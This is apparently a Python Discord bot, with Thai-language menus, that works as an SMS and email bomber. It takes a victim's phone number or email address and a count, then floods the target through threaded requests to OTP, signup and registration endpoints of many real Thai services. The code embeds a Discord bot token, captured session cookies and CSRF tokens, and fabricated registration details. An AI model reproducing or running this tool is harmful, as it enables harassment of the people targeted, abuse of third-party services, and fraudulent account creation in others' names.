import interactions
import sys
import os
import random
import time
import requests as ru
import requests
from re import search
from requests import Session, post, get
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bs
from re import search
from user_agent import generate_user_agent
from interactions import Button, ButtonStyle, CommandContext, SelectMenu, SelectOption, ActionRow, Modal, TextInput, TextStyleType, Embed

threading = ThreadPoolExecutor(max_workers=int(100000))
client = interactions.Client("MTAwMzI2OTQ1ODY1MzEwMjExMA.GXcpHz.O8xMpBjIHCKmgl9O9h_MPkKhtcB8kiChP7cQ0I", intents=interactions.Intents.DEFAULT | interactions.Intents.GUILD_MESSAGES)

@client.event
async def on_start():
	print('Online !')
	
@client.command(name="sms", description="สำหรับเปิดใช้งานยิงเบอร์")
async def send_modal(ctx: CommandContext):
	modal = Modal(
		custom_id="start-sms",
		title="144hz SPAM SMS",
		components=[
			TextInput(
				style=TextStyleType.SHORT,
				custom_id="text-input-1",
				label=f"กรุณาใส่เบอร์ที่ต้องการจะยิง",
				placeholder="ตัวอย่าง 08xxxxxxxx",
			),
			TextInput(
				style=TextStyleType.SHORT,
				custom_id="text-input-2",
				label=f"จำนวน",
				placeholder="จำนวนต้องไม่เกิน 100",
			),
		],
	)
	await ctx.popup(modal)
	
	
@client.modal("start-sms")
async def start_sms(ctx: CommandContext, one, two):
	phone = one
	jam = two
	if int(two) >= 1001:
		embed = Embed(
			title="คำขอของคุณ",
			description="ไม่สำเร็จ [จำนวนต้องไม่เกิน 1000]",
			color=0xff0000
		)
		await ctx.send(embeds=embed)
	else:
		embed = Embed(
			title="คำขอของคุณ",
			description="สำเร็จแล้ว",
			color=0xff0000
		)
		await ctx.send(embeds=embed)
		DM_sms(phone, jam)
		
@client.command(name="email", description="สำหรับเปิดใช้งานยิงเมลล์")
async def send_modal(ctx: CommandContext):
	modal = Modal(
		custom_id="mail-star",
		title="144hz SPAM EMAIL",
		components=[
			TextInput(
				style=TextStyleType.SHORT,
				custom_id="text-input-1",
				label=f"กรุณาใส่เมลล์ที่ต้องการจะยิง",
				placeholder="ตัวอย่าง mOdel.Sticker@gmail.com",
			),
			TextInput(
				style=TextStyleType.SHORT,
				custom_id="text-input-2",
				label=f"จำนวน",
				placeholder="จำนวนต้องไม่เกิน 50",
			),
		],
	)
	await ctx.popup(modal)
	
@client.modal("mail-star")
async def mail_start(ctx: CommandContext, one, two):
	name = one
	jam = two
	if int(two) >= 51:
		embed = Embed(
			title="คำขอของคุณ",
			description="ไม่สำเร็จ [จำนวนต้องไม่เกิน 50]",
			color=0xff0000
		)
		await ctx.send(embeds=embed)
	else:
		embed = Embed(
			title="คำขอของคุณ",
			description="สำเร็จแล้ว",
			color=0xff0000
		)
		await ctx.send(embeds=embed)
		onfly(name, jam)
		
def api1(name):
	SEND  = Session()
	API_WEB = SEND.get('https://www.bigthailand.com/login',headers={"user-agent": generate_user_agent()}).text
	SEND_TOKEN = bs(API_WEB,'html.parser')
	TOKEN = SEND_TOKEN.find("input",attrs={"name":"auth._token.local"})
	SMS = SEND.post("https://www.bigthailand.com/authentication-service/user/OTP",headers={"user-agent": generate_user_agent(),"authorization": f"Bearer {TOKEN}['value']","content-type": "application/json;charset=UTF-8","cookie": f"""auth.strategy=local; auth._token.local=Bearer%20{TOKEN}['value]; _pk_ref.564990563.2c0e=%5B%22google%22%2C%22%22%2C1664004463%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990563.2c0e=*; _gcl_au=1.1.1986299425.1664004463; _cdp_cfg=1; _asm_visitor_type=n; _ac_au_gt=1664004464356; _gid=GA1.2.681823710.1664004464; _gat_UA-165856282-1=1; popupTimeStamp=%7B%22popupIdx%22%3A0%2C%22expiredAt%22%3A%222022-09-24T07%3A57%3A43.685Z%22%7D; _asm_uid=890390276; cdp_session=1; _fbp=fb.1.1664004464406.202179650; _ga=GA1.2.2004890464.1664004464; _gac_UA-165856282-1=1.1664004466.Cj0KCQjw1bqZBhDXARIsANTjCPJYsw6vOZXFPznA9K3T9a7DJPSigqMeogNJR_toRTt9mJVPQifKu9IaAuM3EALw_wcB; isiframeenabled=true; _tt_enable_cookie=1; _ttp=fb53a55e-7e89-482c-8dcc-7d65cc3a9d43; _gcl_aw=GCL.1664004467.Cj0KCQjw1bqZBhDXARIsANTjCPJYsw6vOZXFPznA9K3T9a7DJPSigqMeogNJR_toRTt9mJVPQifKu9IaAuM3EALw_wcB; bigthailand-_zldp=OM%2F3Rx7iTnXlJ%2BG06WL7xCVOFTKwr0NmKdBzRqdYXCGLMGKJRuNpNfzZ9I3mvVMsodoRkLyJC2Y%3D; bigthailand-_zldt=93ed1974-6077-46c9-80b4-5d8af7b21d11-2; _ga_80VN88PBVD=GS1.1.1664004463.1.1.1664004470.53.0.0; _pk_id.564990563.2c0e=0.1664004463.1.1664004484.1664004463.; _ac_client_id=890389481.1664004485; _ac_an_session=zmzmzmzjzmzgzmzmzizjzdzrzqzjzgzrzqznzrzizdzizlzlznzjzjznznzrzmzdzizdzizlzlznzjzjznznzrzmzdzizlzlznzjzjznznzrzmzdzizdzgzjzizdzjzd2h25zdzgzdznzkzmzqzrzd; au_id=890389481; OptanonAlertBoxClosed=2022-09-24T07:28:08.466Z; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Sep+24+2022+14%3A28%3A08+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.33.0&isIABGlobal=false&hosts=&consentId=47109f59-44b2-40f3-b0c9-4e0b0c8cd8a9&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1%2CC0007%3A1"""},json={"locale":"th","phone":"+66802059789","email":name,"userParams":{"buyerName":"sfiushjud fusdhfus","activateLink":"www.google.com"}})

def api2(name):
	y = ['08','09','06']
	x = random.choice(y)
	s = random.randint(1111111,99999999)
	requests.post("https://client.moon-vps.com/api.php?controller=user&action=register",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","cookie": "PHPSESSID=4pqnujrl9qrtj344811reaqq49;_ga=GA1.2.1424807220.1665503625;_gid=GA1.2.1884144315.1665503625;_gat=1"},json={"controller":"user","action":"register","params":{"name":"GENIX SHOP","company":"","address":"Bankkok","phone":f"{x}{s}","email":name,"password":"123456Az"}})

def api3(name):
	res = requests.post("https://au.moveongame.com/member/joinemaildo.php",
	headers = {
		"user-agent": "Mozilla/5.0 (Linux; Android 9; CPH2015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
		"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
		"cookie": "_gcl_au=1.1.2125653504.1665993067;_gid=GA1.2.751589440.1665993068;PHPSESSID=mjlv1ethp1nu3phhacu3iu5734;_ga_PBYDNCGKP0=GS1.1.1665993071.1.1.1665993193.0.0.0;_ga=GA1.2.2094137713.1665993068"
	}, data = f"signup-email={name}")
	
def onfly(name, jam):
	for x in range(int(jam)):
		threading.submit(api1, name)
		threading.submit(api2, name)
		threading.submit(api3, name)


def gx1(phone):
	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})

def gx2(phone):
	requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"})

def gx3(phone):
	requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.760",headers={"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"})

def gx4(phone):
	requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0})

def gx5(phone):
	requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def gx6(phone):
	requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
	
def gx7(phone):
	requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"})
	
def gx8(phone):
	requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",headers={"authorization": "Basic d2ViQXBwOndlYkFwcA==","content-type": "application/x-www-form-urlencoded;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},data=f"phone={phone[1:]}&type=1")
	
def gx9(phone):
	requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}")

def gx10(phone):
	requests.post("https://ep789bet.net/auth/send_otp",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","user-agent": "ep789bet=g9b6cbooof7sq9tmmdtside6s1topdus;__cf_bm=N34Ldd3PZGzyar210NA3MW6tlk6DVyL7TRWX9siAsXk-1657612222-0-AchySBWuKW05LLldbYqjOGsQ9fG8ijO20enZMUqVHANUif9L3qqazpIcC5nC+tUMIfCoSH575g2k16EyMHk43KcE5tZmJTd+lHogz8Rpd3lKbU3eUD1RsrUmgeJwbddVBQ=="},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=")

def gx11(phone):
	requests.post("https://api-sso.ch3plus.com/user/request-otp",headers={'user-agent': generate_user_agent()},json={"tel":phone,"type":"login"})

def gx12(phone):
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})

def gx13(phone):
	requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"})
	
def gx14(phone):
	requests.get(f"https://4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com/dev/request-otp/+66{phone[1:]}",headers={"authority": "4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"})
	
def gx15(phone):
	requests.post("https://api.fairdee.co.th/profile/request-otp",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "mp_184c9deb723214f5772e9320157cb5b9_mixpanel=%7B%22distinct_id%22%3A%20%22183bbb5007ddf-0261f79d6d1bad-5771031-1fa400-183bbb5007e6f9%22%2C%22%24device_id%22%3A%20%22183bbb5007ddf-0261f79d6d1bad-5771031-1fa400-183bbb5007e6f9%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; WZRK_G=a566c075343f4d118e2b0f35111f6f22; WZRK_S_69W-676-R46Z=%7B%22p%22%3A1%2C%22s%22%3A1665301546%2C%22t%22%3A1665301545%7D; _ga=GA1.3.837932271.1665301552; _gid=GA1.3.1240970639.1665301552; _gat=1; _gcl_au=1.1.1486581940.1665301553; _gat_gtag_UA_116460668_3=1; ajs_anonymous_id=578a9b90-fec5-409e-9b9e-60461e79d2a8; _fbp=fb.2.1665301553007.478015998","accept": "application/json, text/plain, */*"},json={"username":phone,"username_type":"phone","intent":"signup","is_email_otp":'false'})

def gx16(phone):
	requests.post("https://www.ctrueshop.com/member.php?page=25&type=9",headers={"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","content-type": "application/x-www-form-urlencoded","cookie": "PHPSESSID=1po9v1nrrem5fr8co6urk37lv1; _gcl_au=1.1.867007754.1665302231; _ga=GA1.2.1978432786.1665302231; _gid=GA1.2.1842911343.1665302231; _gat_gtag_UA_19183081_1=1; __sdwc=0978bae8-1717-4f1b-9f1a-dcf9dce81fa8; rchatbox:checkCrossOriginWebdata=1665302236917","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},data=f"tel1={phone}&affiliate=2&social=")
	
def gx17(phone):
	get(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=")

def gx18(phone):
	requests.post("https://www.theconcert.com/rest/request-otp",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": generate_user_agent(),"x-requested-with": "XMLHttpRequest","x-csrf-token": "d6VfYNo3-RJK5IK0axoCE7KLIAPbW9K0IbL8","x-xsrf-token": "b2b9a4f732d05668c61e64f836417f67/iS0TaMFdXciRQYns4jNXpeVYy3DlvGY6ML+q8oquXvseUvcnIelmUwwR9/wJHKHjGKfN0+WS9orN1zdtt4J3I72qJ3x4Va07eBC0isPMu4ktiZw5DvLcobqJ9l39rFP"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4})
	
def gx19(phone):
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	
def gx20(phone):
	SEND  = Session()
	API_WEB = SEND.get('https://www.bigthailand.com/login',headers={"user-agent": generate_user_agent()}).text
	SEND_TOKEN = bs(API_WEB,'html.parser')
	TOKEN = SEND_TOKEN.find("input",attrs={"name":"auth._token.local"})
	SMS = SEND.post("https://www.bigthailand.com/authentication-service/user/OTP",headers={"user-agent": generate_user_agent(),"authorization": f"Bearer {TOKEN}['value']","content-type": "application/json;charset=UTF-8","cookie": f"""auth.strategy=local; auth._token.local=Bearer%20{TOKEN}['value]; _pk_ref.564990563.2c0e=%5B%22google%22%2C%22%22%2C1664004463%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990563.2c0e=*; _gcl_au=1.1.1986299425.1664004463; _cdp_cfg=1; _asm_visitor_type=n; _ac_au_gt=1664004464356; _gid=GA1.2.681823710.1664004464; _gat_UA-165856282-1=1; popupTimeStamp=%7B%22popupIdx%22%3A0%2C%22expiredAt%22%3A%222022-09-24T07%3A57%3A43.685Z%22%7D; _asm_uid=890390276; cdp_session=1; _fbp=fb.1.1664004464406.202179650; _ga=GA1.2.2004890464.1664004464; _gac_UA-165856282-1=1.1664004466.Cj0KCQjw1bqZBhDXARIsANTjCPJYsw6vOZXFPznA9K3T9a7DJPSigqMeogNJR_toRTt9mJVPQifKu9IaAuM3EALw_wcB; isiframeenabled=true; _tt_enable_cookie=1; _ttp=fb53a55e-7e89-482c-8dcc-7d65cc3a9d43; _gcl_aw=GCL.1664004467.Cj0KCQjw1bqZBhDXARIsANTjCPJYsw6vOZXFPznA9K3T9a7DJPSigqMeogNJR_toRTt9mJVPQifKu9IaAuM3EALw_wcB; bigthailand-_zldp=OM%2F3Rx7iTnXlJ%2BG06WL7xCVOFTKwr0NmKdBzRqdYXCGLMGKJRuNpNfzZ9I3mvVMsodoRkLyJC2Y%3D; bigthailand-_zldt=93ed1974-6077-46c9-80b4-5d8af7b21d11-2; _ga_80VN88PBVD=GS1.1.1664004463.1.1.1664004470.53.0.0; _pk_id.564990563.2c0e=0.1664004463.1.1664004484.1664004463.; _ac_client_id=890389481.1664004485; _ac_an_session=zmzmzmzjzmzgzmzmzizjzdzrzqzjzgzrzqznzrzizdzizlzlznzjzjznznzrzmzdzizdzizlzlznzjzjznznzrzmzdzizlzlznzjzjznznzrzmzdzizdzgzjzizdzjzd2h25zdzgzdznzkzmzqzrzd; au_id=890389481; OptanonAlertBoxClosed=2022-09-24T07:28:08.466Z; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Sep+24+2022+14%3A28%3A08+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.33.0&isIABGlobal=false&hosts=&consentId=47109f59-44b2-40f3-b0c9-4e0b0c8cd8a9&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1%2CC0007%3A1"""},json={"locale":"th","phone":f"+66{phone[1:]}","email":"asjfgyfg2@hbsfsdf.sdf","userParams":{"buyerName":"sfiushjud fusdhfus","activateLink":"www.google.com"}})
	
def gx21(phone):
	session = Session()
	ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
	session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
	
def gx22(phone):
	ru.post("https://www.tgfone.com/signin/add_register",headers={"content-type": "application/x-www-form-urlencoded","user-agent": generate_user_agent(),"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "PHPSESSID=6d00c9f6d3b9b31a559fbc13edb560d4e571fb71;_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_gat_gtag_UA_163796127_1=1;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657955943.0;_ga=GA1.2.160165897.1657955937"},data=f"mobile_form={phone}&password_form=as257400As&confirmpassword_form=as257400As&name_form=skkdmx&lastname_form=dkmsxm&stype=2")
